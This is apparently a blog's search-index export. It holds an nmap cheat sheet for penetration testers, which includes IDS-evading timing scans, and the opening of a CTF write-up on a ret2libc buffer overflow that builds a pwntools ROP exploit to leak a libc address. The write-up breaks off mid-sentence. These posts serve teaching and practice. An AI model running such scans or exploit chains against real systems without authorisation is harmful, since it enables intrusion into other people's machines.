[{"categories":["cheatsheet"],"content":"I will describe about the nmap tool in detail and ways to use the tool precisely.","date":"2021-08-06","objectID":"/nmap/","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"I will describe the nmap tool in detail and ways to use the tool precisely especially for penetration testers. ","date":"2021-08-06","objectID":"/nmap/:0:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Introduction Nmap is a free and open source tool which is especially used for scanning and identifying the open ports i.e. discovery hosts. There are a total of 65535 available ports; This tool is especially used for initial enumeration . ","date":"2021-08-06","objectID":"/nmap/:1:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Scan types ","date":"2021-08-06","objectID":"/nmap/:2:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Target specification Just to scan with IP address root@gr4n173:~$ nmap 10.150.150.10 To scan the multiple targets with IP range root@gr4n173:~$ nmap 10.150.150.1-254 Scan whole network Sometimes we wish to scan a whole network of adjacent hosts. This nmap supports CIDR-style addressing. We just have to append /\u003cnumbits\u003e to an ip address or hostname for example:- hostname, ip address, networks. root@gr4n173:~$ nmap 10.150.150.10/24 ","date":"2021-08-06","objectID":"/nmap/:2:1","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Host Discovery Scanning every port of every single ip address is slow and usually necessary. So host discovery or ping scan comes into play i.e. this will demonstrate that ip addresses which are actually active. List the target hosts(-sL) This can be done using List Scan as -sL and this can’t be combined with port scanning, os detection, host discovery. root@gr4n173:~$ nmap -sL google.com Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 14:38 +0545 Nmap scan report for google.com (172.217.160.142) Other addresses for google.com (not scanned): 2404:6800:4007:80a::200e rDNS record for 172.217.160.142: maa03s29-in-f14.1e100.net Nmap done: 1 IP address (0 hosts up) scanned in 0.09 seconds No port scan ( -sn) In order to host discovery without port scan and only print out the available hosts that respond to host discovery we can use -sn options. This can be combined with any of the discovery probe types( -P*) for greater flexibility. To identify the running host without port scan/host discovery we can combine it with root@gr4n173:~$ nmap -sn -Pn 10.150.150.10-15 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 14:44 +0545 Nmap scan report for 10.150.150.10 Host is up. Nmap scan report for 10.150.150.11 Host is up. Nmap scan report for 10.150.150.12 Host is up. Nmap scan report for 10.150.150.13 Host is up. Nmap scan report for 10.150.150.14 Host is up. Nmap scan report for 10.150.150.15 Host is up. Nmap done: 6 IP addresses (6 hosts up) scanned in 0.02 seconds No ping ( -Pn) Without ping and host discovery we can determine the open port with -Pn . Here we already have to know the active ip address so, this scan assumes the given ip is active. root@gr4n173:~$ nmap -Pn 10.150.150.11 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 14:55 +0545 Nmap scan report for 10.150.150.11 Host is up (0.19s latency). Not shown: 985 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 1433/tcp open ms-sql-s ","date":"2021-08-06","objectID":"/nmap/:2:2","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Port Scanning Basic states involved in port scan are open, closed, filtered, unfiltered. All these states are same as their basic meaning except unfiltered; it can be combined with other scans like Window Scan, SYN Scan or FIN Scan which helps to identify whether the port is open or not. In port scanning we required administrator privileges. Techniques involved 1. SYN Scan (-sS) This scan is known as TCP SYN Scanand is default i.e. it can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. root@gr4n173:~$ sudo nmap -sS 10.150.150.12-20 Nmap scan report for 10.150.150.12 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh Nmap scan report for 10.150.150.18 Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 2.Connect Scan(-sT) When we don’t have admin privileges we can use TCP connect scan which gives same result as that of SYN scan. So if we have admin privileges we are advised to use syn scan rather than connect scan. root@gr4n173:~$ nmap -sT 10.150.150.200-205 Nmap scan report for 10.150.150.202 Host is up (0.19s latency). Not shown: 995 closed ports PORT STATE SERVICE 22/tcp open ssh 88/tcp open kerberos-sec 445/tcp open microsoft-ds 3031/tcp open eppc 3689/tcp open rendezvous Nmap scan report for 10.150.150.212 Host is up (0.20s latency). Not shown: 986 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3. UDP Scans UDP Services are widely deployed. DNS, SNMP and DHCP (registered ports 53,161/162, 67/68) are commonly used. Scan is activated with -sUoptions and can be combined with tcp scan type such as SYN scan(-sS) to check both protocols during the same run. root@gr4n173:~$ sudo nmap -sU 10.150.150.10 ","date":"2021-08-06","objectID":"/nmap/:2:3","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Port Specification and Scan order Scan only specific ports(-p) Scanning specified ports is done so as to scan only required ports and we can define the ranges using hyphen as (1-100). We can define which types of protocol as T: for tcp and U: for UDP. Similarly in order to scan all the ports -p- is specified which will scan from 1 to 65535 ports. root@gr4n173:~$ nmap -p 1-10000 10.150.150.11 Nmap scan report for 10.150.150.12 Host is up (0.20s latency). Not shown: 9998 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 269.13 seconds Exclude the specified ports for scanning (--exclude-ports) This is the same as that of specified ports scanning. root@gr4n173:~$ nmap --exclude-ports 1-10000 10.150.150.11 Fast Scan (-F) Basically when nmap scans the most common port 1,000 ports are scanned but with this it will reduce to 100 . This option will only scan ports that are named in the service file. root@gr4n173:~$ nmap -F 10.150.150.11 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 16:13 +0545 Nmap scan report for 10.150.150.11 Host is up (0.20s latency). Not shown: 98 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds Top ports (--top-ports \u003cn\u003e) In order to scan the top ports we have to specify the highest number to be searched. root@gr4n173:~$ nmap --top-ports 1000 10.150.150.11 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 16:15 +0545 Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 99.55% done; ETC: 16:16 (0:00:00 remaining) Nmap scan report for 10.150.150.11 Host is up (0.19s latency). Not shown: 985 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds ","date":"2021-08-06","objectID":"/nmap/:2:4","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Version Detection Determining the version and service of a certain port helps to dig deeper so that we can exploit the certain service of a specific version. We can use -sV for version detection . root@gr4n173:~$ nmap -sV 10.150.150.11 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 16:23 +0545 Nmap scan report for 10.150.150.12 Host is up (0.24s latency). Not shown: 98 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds ","date":"2021-08-06","objectID":"/nmap/:2:5","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"OS Detection Nmap best feature is remote os detection using tcp/ip stack fingerprinting. Here nmap will sends a series of TCP and UDP packets to the remote host and examines pratically every bit in the responses. Nmap will compares the results to its nmap-os-db database of more than 2,600 known OS fingerprints and prints out the OS details if matched. OS can be detected using -O options as root@gr4n173:~$ sudo nmap -sV -O 10.150.150.11 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 16:29 +0545 Nmap scan report for 10.150.150.12 Host is up (0.19s latency). Not shown: 98 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)[85/1339] 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2012 11.00.2100; RTM TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=6/18%OT=21%CT=7%CU=33980%PV=Y%DS=2%DC=I%G=Y%TM=60CC78A OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS= OS:7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5 OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200 OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y% OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD= OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0% OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1( OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI= OS:N%T=80%CD=Z) Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . ","date":"2021-08-06","objectID":"/nmap/:2:6","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Nmap Scripting Engine(NSE) NSE can be used for vulnerability detection, network discovery, backdoor detection, vulnerability exploitation etc. 1. Default (-sC) Performs a script scan with the default set of scripts. Some of the scripts are considerably intrusive and shouldn’t run against the target network without permission. root@gr4n173:~$ nmap -sC 10.150.150.11 Nmap scan report for 10.150.150.11 Host is up (0.19s latency). Not shown: 985 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: PwnDrive - Your Personal Online Storage 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https | http-cookie-flags: | /: | PHPSESSID: | secure flag not set and HTTPS in use |_ httponly flag not set |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 2. Run scripts (--script) To run the scripts using comma separated list of filenames, script, directories etc we can use this options as root@gr4n173:~$ nmap --script \"smb-vuln-*\" 10.150.150.11 Nmap scan report for 10.150.150.11 Host is up (0.19s latency). Not shown: 985 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds 3.To update the database We can update the database of nmap exploit as --script-updatedb. root@gr4n173:~$ nmap --script-updatedb ","date":"2021-08-06","objectID":"/nmap/:2:7","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Timing and performance When it comes to scanning with nmap performance has been a top priority with the utilization of parallelism tasks. Set a timing template(-T\u003c0-5\u003e) Nmap has the option of setting six templates. These numbers are paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). paranoid scan The main effects of T0 are serializing the scan so only one port is scanned at a time, and waiting five minutes between sending each probe. root@gr4n173:~$ nmap 10.150.150.10 -T0 sneaky scan This scan will avoid IDS alerts, they will take an extraordinarily long time to scan thousands of machines or ports. root@gr4n173:~$ nmap 10.150.150.10 -T1 polite scan This scan is similar to the -T0 and -T1 but it is a bit faster than those. It will slow down the scan to use less bandwidth and target machine resources. root@gr4n173:~$ nmap 10.150.150.10 -T2 normal scan This scan is Nmap’s default behavior, which includes parallelization. root@gr4n173:~$ nmap 10.150.150.10 -T3 aggressive scan This scan will prohibit the dynamic scan delay from exceeding 10 ms for TCP ports. I would always recommend using this type of scan. root@gr4n173:~$ nmap 10.150.150.10 -T4 insane scan Scan is really insane that it can’t give you a correct and precise scan. root@gr4n173:~$ nmap 10.150.150.10 -T5 Specifying the speed rates Usually scanning all ports of a certain target is too slow so we can specify the lowest speed of scanning and can’t scan 300 packets per sec as below. root@gr4n173:~$ nmap --min-rate 300 10.150.150.10 We can also limit the max rate of sending the packet as 100 packets per sec. root@gr4n173:~$ nmap --max-rate 100 10.150.150.10 ","date":"2021-08-06","objectID":"/nmap/:2:8","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Output Basically we can output in three forms: normal, xml and grepable format. Normal format root@gr4n173:~$ nmap -oN scan 10.150.150.10 xml format root@gr4n173:~$ nmap -oX scan 10.150.150.10 grepable format root@gr4n173:~$ nmap -oG scan 10.150.150.10 ","date":"2021-08-06","objectID":"/nmap/:2:9","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Combining all those from above We can scan ip 10.150.150.10 for top 10000 ports along with version, script scan and saving it as normal format in file nmap.txt. root@gr4n173:~$ sudo nmap -sV -sC -oN nmap.txt -Pn 10.150.150.10 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 16:29 +0545 Nmap scan report for 10.150.150.10 Host is up (0.19s latency). Not shown: 98 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)[85/1339] [snippet] ","date":"2021-08-06","objectID":"/nmap/:3:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"This is how I nmap Normally, at first I scan all the ports with min-rate to 10000 so that I can identify opened ports and then I go for script, version run with defined ports and save it to normal to review later. root@gr4n173:~$ sudo nmap -p- --min-rate 10000 -oN nmap-ports.txt 10.150.150.10 Nmap scan report for 10.150.150.10 Host is up (0.19s latency). Not shown: 985 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 3306/tcp open mysql 5040/tcp open unknown 7680/tcp open pando-pub 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds root@gr4n173:~$ sudo nmap -p 21, 80, 135, 139, 443, 445, 1433, 3306, 5040, 7680, 49664, 49665, 49666, 49667, 49668 -sC -sV -oN opened-ports-services.txt 10.150.150.10 Nmap scan report for 10.150.150.10 Host is up (0.19s latency). Not shown: 985 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: PwnDrive - Your Personal Online Storage 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https | http-cookie-flags: | /: | PHPSESSID: | secure flag not set and HTTPS in use |_ httponly flag not set |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 3306/tcp open mysql? | fingerprint-strings: | NULL, WMSRequest: |_ Host '10.150.150.10' is not allowed to connect to this MariaDB server 5040/tcp open unknown 7680/tcp open pando-pub? 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.91%I=7%D=2/20%Time=60315D9B%P=x86_64-pc-linux-gnu%r(NU SF:LL,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.150\\.150\\.10'\\x20is\\x20not\\x20allow SF:ed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(WMSRequest,4 SF:A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.150\\.150\\.10'\\x20is\\x20not\\x20allowed\\x SF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\"); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 2m32s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-03-20T19:11:17 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 172.89 seconds ","date":"2021-08-06","objectID":"/nmap/:4:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Conclusion Having the idea to use nmap precisely plays a great role for penetration testers due to its ease of use, accuracy, flexibility and high performance. Though you can find many nmap cheat sheets you can refer to them. I have blogged this just to keep as further reference for myself. If you have any problem related to the functionality of nmap then you can visit the main page of nmap. Thanks for staying with me throughout this blog and hope you have learned some new techniques. ","date":"2021-08-06","objectID":"/nmap/:5:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["cheatsheet"],"content":"Resources https://nmap.org/book/man.html https://www.tutorialspoint.com/nmap-cheat-sheet https://en.wikipedia.org/wiki/Nmap https://hakin9.org/nmap-cheat-sheet/ ","date":"2021-08-06","objectID":"/nmap/:6:0","tags":["linux","nmap","networking"],"title":"Nmap Cheat Sheet","uri":"/nmap/"},{"categories":["ctf"],"content":"I will explain about the pwn challenges that I solved during CTF.","date":"2020-07-11","objectID":"/ret2libc/","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Hello pwners !! It’s been a long time since the last post. I was unable to continue my series on Exploitation\u0026Pwning due to my busy schedule. But anyway I’m here with the second post on Exploitation\u0026Pwning series. Description Hello pwners !! It’s been a long time since the last post. I was unable to continue my series on Exploitation\u0026Pwning due to my busy schedule. But anyway I’m here with the second post on Exploitation\u0026Pwning series. You can read my first post of this series here. Today I will try to explain about ret2libc attack. ","date":"2020-07-11","objectID":"/ret2libc/:0:0","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Ret2libc “Return-to-Libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine i.e. return address on a call stack by an address of a subroutine that is already present in the process executable memory. Bypassing the no-execute bit feature (if present) and getting a shell by injecting the code as required. In order to be favorable to this attack, attacker can only call pre-existing functions like (puts, read, printf, libcstartmain, etc as per elf file). ","date":"2020-07-11","objectID":"/ret2libc/:1:0","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Pwn Challenge ","date":"2020-07-11","objectID":"/ret2libc/:2:0","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"climb Description [396] Can you help me climb the rope? nc cha.hackpack.club 41702 File: climb Solution:- As soon as I downloaded and ran the file it displayed with some description as root@gr4n173:~$ ./climb Stranger: Help! I'm stuck down here. Can you help me climb the rope? How will you respond? ","date":"2020-07-11","objectID":"/ret2libc/:2:1","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Protection Mechanism After this, I grabbed gdb and started to check the protection mechanism. ❯ gdb -q climb GEF for linux ready, type gef to start, gef config to configure 78 commands loaded for GDB 9.1 using Python engine 3.8 [*] 2 commands could not be loaded, run `gef missing` to know why. Reading symbols from climb... (No debugging symbols found in climb) gef➤ checksec [+] checksec for '/home/gr4n173/hackpack/pwn/climbfile/climb' Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial As per protection mechanism, NX(no-executable) and RelRO was enabled so I couldn’t write the shellcode but instead I was able to use got writable address and get a shell. Likewise Canary disable indicated there was buffer overflow. Let’s assume that ASLR was also enabled in the server. gef➤ info functions All defined functions: Non-debugging symbols: 0x00000000004004e8 _init 0x0000000000400510 puts@plt 0x0000000000400520 setbuf@plt 0x0000000000400530 system@plt 0x0000000000400540 printf@plt 0x0000000000400550 read@plt 0x0000000000400560 _start 0x0000000000400590 _dl_relocate_static_pie 0x00000000004005a0 deregister_tm_clones 0x00000000004005d0 register_tm_clones 0x0000000000400610 __do_global_dtors_aux 0x0000000000400640 frame_dummy 0x0000000000400647 _init_ 0x0000000000400650 _glibc_ 0x0000000000400659 _entry1_ 0x0000000000400664 call_me 0x000000000040067f main 0x00000000004006e0 __libc_csu_init 0x0000000000400750 __libc_csu_fini 0x0000000000400754 _fini Here, I noticed a main and call_me functions. Then disassembled main function to see the details. gef➤ disass main Dump of assembler code for function main: 0x000000000040067f \u003c+0\u003e: push rbp 0x0000000000400680 \u003c+1\u003e: mov rbp,rsp 0x0000000000400683 \u003c+4\u003e: sub rsp,0x20 0x0000000000400687 \u003c+8\u003e: mov rax,QWORD PTR [rip+0x2009c2] # 0x601050 \u003cstdout@@GLIBC_2.2.5\u003e 0x000000000040068e \u003c+15\u003e: mov esi,0x0 0x0000000000400693 \u003c+20\u003e: mov rdi,rax 0x0000000000400696 \u003c+23\u003e: call 0x400520 \u003csetbuf@plt\u003e 0x000000000040069b \u003c+28\u003e: lea rdi,[rip+0xc6] # 0x400768 0x00000000004006a2 \u003c+35\u003e: call 0x400510 \u003cputs@plt\u003e 0x00000000004006a7 \u003c+40\u003e: lea rdi,[rip+0xff] # 0x4007ad 0x00000000004006ae \u003c+47\u003e: mov eax,0x0 0x00000000004006b3 \u003c+52\u003e: call 0x400540 \u003cprintf@plt\u003e 0x00000000004006b8 \u003c+57\u003e: lea rax,[rbp-0x20] 0x00000000004006bc \u003c+61\u003e: mov edx,0x1f4 0x00000000004006c1 \u003c+66\u003e: mov rsi,rax 0x00000000004006c4 \u003c+69\u003e: mov edi,0x0 0x00000000004006c9 \u003c+74\u003e: call 0x400550 \u003cread@plt\u003e 0x00000000004006ce \u003c+79\u003e: mov eax,0x0 0x00000000004006d3 \u003c+84\u003e: leave 0x00000000004006d4 \u003c+85\u003e: ret End of assembler dump. There you can see one variable with buffer of 0x20(32) and a read function which took the 3 register to store the value. read(0,variable, buffer_size) as 0x00000000004006bc \u003c+61\u003e: mov edx,0x1f4 #buffersize of 500 0x00000000004006c1 \u003c+66\u003e: mov rsi,rax #variable 0x00000000004006c4 \u003c+69\u003e: mov edi,0x0 #0 0x00000000004006c9 \u003c+74\u003e: call 0x400550 \u003cread@plt\u003e Result from above indicated there was buffer overflow. So first thing was to find the offset. For that, you can visit my first post of Exploitation\u0026Pwning series here to know detail about it. ","date":"2020-07-11","objectID":"/ret2libc/:2:2","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Overflow the buffer After finding offset which was40 bytes. Now I can redirect to anywhere I want. Only I need to do now is to pop one of the argument; sequence of arguments in 64 bit are as rdi;rsi;rdx;rcx;r8;r9. Then searched the gadgets related to the poping an arguments as gef➤ ropper --search \"pop r?i\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: pop r?i [INFO] File: /home/gr4n173/climb 0x0000000000400743: pop rdi; ret; 0x0000000000400741: pop rsi; pop r15; ret; Up to here I overflowed the buffer and pop a argument so that I can call to any address I want. Since binary had writable got address due to the partial protection of RelRO I can point to that address and leak. For that I used the functions which was available in the binary file. gef➤ info functions All defined functions: Non-debugging symbols: 0x00000000004004e8 _init 0x0000000000400510 puts@plt 0x0000000000400520 setbuf@plt 0x0000000000400530 system@plt 0x0000000000400540 printf@plt 0x0000000000400550 read@plt 0x0000000000400560 _start 0x0000000000400590 _dl_relocate_static_pie 0x00000000004005a0 deregister_tm_clones 0x00000000004005d0 register_tm_clones 0x0000000000400610 __do_global_dtors_aux 0x0000000000400640 frame_dummy 0x0000000000400647 _init_ 0x0000000000400650 _glibc_ 0x0000000000400659 _entry1_ 0x0000000000400664 call_me 0x000000000040067f main 0x00000000004006e0 __libc_csu_init 0x0000000000400750 __libc_csu_fini 0x0000000000400754 _fini Then searched for got address . gef➤ got GOT protection: Partial RelRO | GOT functions: 5 [0x601018] puts@GLIBC_2.2.5 → 0x7ffff7e54030 #this one [0x601020] setbuf@GLIBC_2.2.5 → 0x7ffff7e5adb0 [0x601028] system@GLIBC_2.2.5 → 0x400536 [0x601030] printf@GLIBC_2.2.5 → 0x7ffff7e34470 [0x601038] read@GLIBC_2.2.5 → 0x7ffff7ecc5c0 Up to this, my payload to leak the address was ","date":"2020-07-11","objectID":"/ret2libc/:2:3","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Leaking the address payload = offset + pop_rdi + puts@got + puts@plt Part1_exploit: - #!/bin/python3 # part1exploit.py from pwn import * # Import pwntools p= remote('cha.hackpack.club',41702) #p = process(\"./climb\") # start the vuln binary elf = ELF(\"./climb\")# Extract data from binary rop = ROP(elf)# Find ROP gadgets PUTS_PLT = elf.plt['puts'] PUTS_GOT = elf.got['puts'] POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep \"pop rdi\" log.info(\"Puts@plt: \" + hex(PUTS)) log.info(\"Pop rdi gadget: \" + hex(POP_RDI)) #Overflow buffer until return address OFFSET = (\"A\"*40).encode() #+ \"B\"*8 # Create rop chain payload1 = OFFSET payload1 += p64(POP_RDI) payload1 += p64(PUTS_GOT) payload1 += p64(PUTS_PLT) p.sendline(payload1) p.interactive() Output :- ❯ python3 part1_exploit.py [+] Opening connection to cha.hackpack.club on port 41702: Done [*] '/home/gr4n173/climb' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] Loaded 16 cached gadgets for './climb' [*] puts@plt: 0x40050c [*] __libc_start_main: 0x601018 [*] pop rdi gadget: 0x400743 [*] Switching to interactive mode b'\\xc0I\\xe7X\\xac\\x7f' [*] Got EOF while reading in interactive From the output of part1 exploit some leak was seen which was random everytime I ran the exploit. So that may be the address leaked. In order to check I tried to strip it and then unpacked as 8 bytes data. ","date":"2020-07-11","objectID":"/ret2libc/:2:4","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Leaking the address of Puts #Parse leaked address recieved = p.recvline().strip() #print(recieved) leak = u64(recieved.ljust(8,b\"\\x00\")) #print(leak) log.info(\"Leaked libc address, Puts: %s\" % hex(leak)) Then combining this to my part1 